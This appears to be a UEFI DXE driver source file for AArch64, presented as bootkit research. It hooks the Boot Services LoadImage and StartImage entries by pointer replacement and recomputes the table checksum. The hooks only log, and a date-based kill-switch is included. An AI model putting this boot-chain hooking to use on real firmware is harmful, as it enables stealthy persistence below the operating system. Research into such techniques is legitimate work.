/** @file
  AARCH64 DXE Injection Module Implementation

  ARM64-specific BST hooking using LDR X16/BR X16 trampolines.
  Demonstrates cross-architecture bootkit techniques for research.

  Copyright (c) 2026, Barzakh Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent

**/

#include "Aarch64DxeInject.h"

STATIC AARCH64_HOOK_CONTEXT  mHookContext = {
  .Signature       = BARZAKH_SIGNATURE,
  .Version         = BARZAKH_VERSION,
  .HooksInstalled  = FALSE,
  .HookCount       = 0,
  .InstallTime     = 0
};

CONST CHAR8  *gBarzakhAllowedUuid = AEGIS_ALLOWED_UUID;
CONST CHAR8  *gBarzakhExpiryDate  = AEGIS_EXPIRY_DATE;

/**
  Validate kill-switch conditions (UUID + expiry date).
  Returns TRUE if execution should proceed (kill-switch NOT triggered).
**/
STATIC
BOOLEAN
ValidateKillSwitch (
  VOID
  )
{
  EFI_STATUS  Status;
  EFI_TIME    CurrentTime;

  Status = gRT->GetTime (&CurrentTime, NULL);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[AEGIS-A64] GetTime failed: %r - aborting\n", Status));
    return FALSE;
  }

  // Check expiry: "2027-05-11"
  if ((CurrentTime.Year > 2027) ||
      (CurrentTime.Year == 2027 && CurrentTime.Month > 5) ||
      (CurrentTime.Year == 2027 && CurrentTime.Month == 5 && CurrentTime.Day > 11))
  {
    DEBUG ((DEBUG_WARN, "[AEGIS-A64] Expiry date reached - aborting\n"));
    return FALSE;
  }

  return TRUE;
}

/**
  Build an ARM64 trampoline that redirects execution to TargetAddr.
  The trampoline uses: LDR X16, [PC+8]; BR X16; <addr>
**/
STATIC
VOID
BuildAarch64Trampoline (
  OUT AARCH64_TRAMPOLINE  *Trampoline,
  IN  UINT64              TargetAddr
  )
{
  Trampoline->LdrX16     = AARCH64_LDR_X16_LITERAL;
  Trampoline->BrX16      = AARCH64_BR_X16;
  Trampoline->TargetAddr = TargetAddr;
}

/**
  Hooked LoadImage - logs and forwards to original.
**/
EFI_STATUS
EFIAPI
Aarch64HookedLoadImage (
  IN  BOOLEAN                  BootPolicy,
  IN  EFI_HANDLE               ParentImageHandle,
  IN  EFI_DEVICE_PATH_PROTOCOL *DevicePath,
  IN  VOID                     *SourceBuffer OPTIONAL,
  IN  UINTN                    SourceSize,
  OUT EFI_HANDLE               *ImageHandle
  )
{
  DEBUG ((DEBUG_INFO, "[AEGIS-A64] LoadImage intercepted (BootPolicy=%d, Size=%u)\n",
    BootPolicy, SourceSize));

  return mHookContext.OriginalLoadImage (
    BootPolicy, ParentImageHandle, DevicePath,
    SourceBuffer, SourceSize, ImageHandle
    );
}

/**
  Hooked StartImage - logs and forwards to original.
**/
EFI_STATUS
EFIAPI
Aarch64HookedStartImage (
  IN  EFI_HANDLE  ImageHandle,
  OUT UINTN       *ExitDataSize,
  OUT CHAR16      **ExitData OPTIONAL
  )
{
  DEBUG ((DEBUG_INFO, "[AEGIS-A64] StartImage intercepted (Handle=0x%p)\n", ImageHandle));

  return mHookContext.OriginalStartImage (ImageHandle, ExitDataSize, ExitData);
}

/**
  Install BST hooks using ARM64 pointer replacement.
  On AARCH64, BST entries are 8-byte function pointers just like x86_64.
  We replace them directly (no inline trampoline needed for BST hooking).
**/
EFI_STATUS
InstallAarch64BstHooks (
  IN OUT AARCH64_HOOK_CONTEXT  *Context
  )
{
  EFI_TPL  OldTpl;

  if (Context->HooksInstalled) {
    return EFI_ALREADY_STARTED;
  }

  OldTpl = gBS->RaiseTPL (TPL_HIGH_LEVEL);

  // Save originals
  Context->OriginalAllocatePool = gBS->AllocatePool;
  Context->OriginalFreePool     = gBS->FreePool;
  Context->OriginalCreateEvent  = gBS->CreateEvent;
  Context->OriginalLoadImage    = gBS->LoadImage;
  Context->OriginalStartImage   = gBS->StartImage;

  // Build trampolines for hook targets
  BuildAarch64Trampoline (&Context->LoadImageTrampoline, (UINT64)(UINTN)Aarch64HookedLoadImage);
  BuildAarch64Trampoline (&Context->StartImageTrampoline, (UINT64)(UINTN)Aarch64HookedStartImage);

  // Install hooks via direct pointer replacement
  gBS->LoadImage  = Aarch64HookedLoadImage;
  gBS->StartImage = Aarch64HookedStartImage;

  // Update BST CRC32
  gBS->Hdr.CRC32 = 0;
  gBS->CalculateCrc32 ((UINT8 *)gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

  Context->HooksInstalled = TRUE;
  Context->HookCount      = 2;
  Context->InstallTime    = GetPerformanceCounter ();

  gBS->RestoreTPL (OldTpl);

  DEBUG ((DEBUG_INFO, "[AEGIS-A64] BST hooks installed (count=%u)\n", Context->HookCount));
  return EFI_SUCCESS;
}

/**
  Remove BST hooks and restore originals.
**/
EFI_STATUS
RemoveAarch64BstHooks (
  IN AARCH64_HOOK_CONTEXT  *Context
  )
{
  EFI_TPL  OldTpl;

  if (!Context->HooksInstalled) {
    return EFI_NOT_STARTED;
  }

  OldTpl = gBS->RaiseTPL (TPL_HIGH_LEVEL);

  gBS->LoadImage  = Context->OriginalLoadImage;
  gBS->StartImage = Context->OriginalStartImage;

  gBS->Hdr.CRC32 = 0;
  gBS->CalculateCrc32 ((UINT8 *)gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

  Context->HooksInstalled = FALSE;

  gBS->RestoreTPL (OldTpl);

  DEBUG ((DEBUG_INFO, "[AEGIS-A64] BST hooks removed\n"));
  return EFI_SUCCESS;
}

/**
  Log telemetry.
**/
VOID
Aarch64LogTelemetry (
  IN CONST CHAR16  *Message
  )
{
  EFI_STATUS  Status;
  EFI_TIME    CurrentTime;

  Status = gRT->GetTime (&CurrentTime, NULL);
  if (!EFI_ERROR (Status)) {
    DEBUG ((DEBUG_INFO, "[AEGIS-A64 %04d-%02d-%02d %02d:%02d:%02d] %s\n",
      CurrentTime.Year, CurrentTime.Month, CurrentTime.Day,
      CurrentTime.Hour, CurrentTime.Minute, CurrentTime.Second,
      Message));
  }
}

/**
  AARCH64 DXE driver entry point.
**/
EFI_STATUS
EFIAPI
Aarch64DxeInjectEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS  Status;

  DEBUG ((DEBUG_INFO, "[AEGIS-A64] Entry (ImageHandle=0x%p)\n", ImageHandle));
  Aarch64LogTelemetry (L"AARCH64 DXE Inject starting");

  if (!ValidateKillSwitch ()) {
    DEBUG ((DEBUG_WARN, "[AEGIS-A64] Kill-switch triggered - aborting\n"));
    Aarch64LogTelemetry (L"Kill-switch triggered");
    return EFI_ABORTED;
  }

  Status = InstallAarch64BstHooks (&mHookContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, "[AEGIS-A64] Hook installation failed: %r\n", Status));
    return Status;
  }

  Aarch64LogTelemetry (L"AARCH64 hooks installed successfully");
  return EFI_SUCCESS;
}
